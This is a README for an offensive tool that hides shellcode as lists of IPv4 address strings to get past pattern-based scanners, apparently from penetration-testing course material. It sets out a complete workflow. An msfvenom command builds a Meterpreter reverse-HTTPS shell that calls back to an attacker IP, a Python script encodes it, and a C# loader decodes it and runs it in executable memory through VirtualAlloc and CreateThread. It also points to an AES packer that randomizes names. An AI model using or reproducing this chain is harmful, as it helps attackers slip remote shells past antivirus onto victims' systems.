# IPv4 Shellcode Encoder

Encodes shellcode bytes as IPv4 address strings. The encoded form looks like a list of IP addresses — pattern-based scanners looking for shellcode byte sequences won't match.

---

## How it works

Each 4 bytes of shellcode become one IPv4 address: `\xfc\x48\x83\xe4` → `"252.72.131.228"`

The C# loader decodes at runtime using `IPAddress.Parse()` — a standard .NET API with no offensive associations.

---

## Workflow

```bash
# 1. Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f raw -o shell.bin

# 2. Encode
python3 ipv4-encoder.py shell.bin

# 3. Paste output into a C# loader
```

The script outputs a `string[]` array and a `DecodeIPv4()` helper to paste into your C# loader.

---

## In a C# loader

```csharp
// Paste the array from the encoder:
string[] s = {
    "252.72.131.228",
    "240.72.137.229",
    // ... all IPs ...
};

// Decode back to bytes:
byte[] shellcode = DecodeIPv4(s);

// Execute (standard VirtualAlloc runner):
IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
Marshal.Copy(shellcode, 0, mem, shellcode.Length);
IntPtr h = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(h, 0xFFFFFFFF);
```

---

## osepacker.py

Also in this directory: `osepacker.py` — a full AES packer that takes raw shellcode and generates a complete C# loader with randomized class/delegate names. The IPv4 encoder is complementary: use IPv4 encoding when you want a different visual pattern; use osepacker.py when you need AES encryption.
